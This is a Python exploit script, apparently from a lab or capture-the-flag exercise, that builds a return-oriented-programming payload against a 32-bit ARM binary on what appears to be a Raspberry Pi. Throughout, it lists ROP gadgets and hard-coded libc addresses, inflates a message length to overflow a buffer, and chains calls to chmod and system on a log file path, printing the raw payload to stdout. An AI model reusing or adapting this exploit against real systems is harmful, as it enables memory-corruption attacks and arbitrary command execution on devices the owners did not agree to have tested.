import struct
import sys

# Sample of how our program should look like, or how we want it to look like

#00010450 <main>:
#   10450:	e92d4800 	push	{fp, lr}
#   10454:	e28db004 	add	fp, sp, #4

# Calling chmod
#   10458:	e59f0024 	ldr	r0, [pc, #36]	; 10484 <main+0x34>
#   1045c:	e59f1024 	ldr	r1, [pc, #36]	; 10488 <main+0x38>
#   10460:	ebffffaa 	bl	10310 <chmod@plt>
#   10464:	e3a0000b 	mov	r0, #11
#   10468:	e59f1014 	ldr	r1, [pc, #20]	; 10484 <main+0x34>

# Using syscall or
#   1046c:	e3a02000 	mov	r2, #0
#   10470:	e3a03000 	mov	r3, #0
#   10474:	ebffffa2 	bl	10304 <syscall@plt>

# Using execve
#   10468:       e3a01000        mov     r1, #0
#   1046c:       e3a02000        mov     r2, #0
#   10470:       ebffffa3        bl      10304 <execve@plt>

#   10478:	e3a03000 	mov	r3, #0
#   1047c:	e1a00003 	mov	r0, r3
#   10480:	e8bd8800 	pop	{fp, pc}
#   10484:	00010500 	.word	0x00010500
#   10488:	00000309 	.word	0x00000309
#
###########################################################################
# LIST OF USEFUL GADGETS:#######################################

POP_R3 = 0x00010734         # pop {r3, pc}
MOV_R3_R0 = 0x00010bb0      # mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
POP_8 =  0x00010c10         # pop {r3, r4, r5, r6, r7, r8, sb, pc} 
R7_INTO_R0 = 0x00010bf8     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3 
POP_FP = 0x00010974         # pop {fp, pc}
POP_r4 = 0x0001090c         # pop {r4, pc}
MOV_R8_R1 = 0x00010c2c      # mov r1, r8 ; mov r2, sb ; blx r3
POP_LR = 0x00010928         #pop {r3, lr} ; b #0x108c8 ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; beq #0x1093c ; blx r3

DUMMY = "ABAB"

# Gadget Staging area
#payload += struct.pack("i", POP_8) # Now 8 is loaded in
#payload += struct.pack("i", 0x76df5160) # branch for R7_INTO_R0 to chmod
#payload += DUMMY # Padding for r4
#payload += DUMMY # Padding for r5
#payload += DUMMY # Padding for r6
#payload += struct.pack("i", LOG_TXT)
#payload += struct.pack("i", 0x309)
#payload += DUMMY # Padding for sb
#payload += struct.pack("i", R7_INTO_R0) # r8 to r1 r7 to r0
# Here chmod has been called, now we do execve, at this point, 
# we execute POP_8 again iff R4 == R6, which it is, due to POP8 previously
# We will be doing R7_INTO_R0 again here
#payload += struct.pack("i", SYSTEM)# r3 #R3 needs to be the address of R7_INTO_R0's bx
#payload += DUMMY# r4
#payload += DUMMY# r5
#payload += DUMMY# r6
#payload += struct.pack("i", LOG_TXT)# r7 #R7 needs to be the address of log file string
#payload += DUMMY# r8
#payload += DUMMY# sb
#payload += struct.pack("i", R7_INTO_R0)# pc after popping we redirect to move r7 into r0



################################################################
# LIST OF USEFUL ADDRESSES:
# LIBC: 0x76d33000 - 0x76e70000
# libwiringPi : 0x76f84000 - 0x76fa1000
CHMOD =  0x76df5160
SYSCALL =  0x76e00c20
SYSTEM = 0x76f55308
EXECVE =  0x76dd2814
# "/bin/sh": 0x76e50b20
LOG_TXT = 0x00010c8c #"/usr/pi/log.txt" 
################################################################
# Normally message size will follow the payload size, but for an overflow
# we set this to a high value, enough to acommodate our ROP payload
message_size = struct.pack("i", 0x000004B0);

padding = "AABBCCDDEEFFGGHH"
padding += "A" * 988
# The following jump will access the secret function within the binary itself.
payload = struct.pack("i", POP_8);

# chmod part
payload += struct.pack("i", CHMOD) # branch for R7_INTO_R0 to chmod
payload += DUMMY # Padding for r4
payload += DUMMY # Padding for r5
payload += DUMMY # Padding for r6
payload += struct.pack("i", LOG_TXT)
payload += struct.pack("i", 0x00000309)
payload += DUMMY # Padding for sb
payload += struct.pack("i", R7_INTO_R0) # r8 to r1 r7 to r0

# system part
payload += struct.pack("i", SYSTEM)# r3 #R3 needs to be the address of R7_INTO_R0's bx
payload += DUMMY# r4
payload += DUMMY# r5
payload += DUMMY# r6
payload += struct.pack("i", LOG_TXT)# r7 #R7 needs to be the address of log file string
payload += DUMMY# r8
payload += DUMMY# sb
payload += struct.pack("i", R7_INTO_R0)# pc after popping we redirect to move r7 into r0
payload += "KKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ"

# print will print with a LF character. Write prints without
sys.stdout.write(message_size + padding + payload)
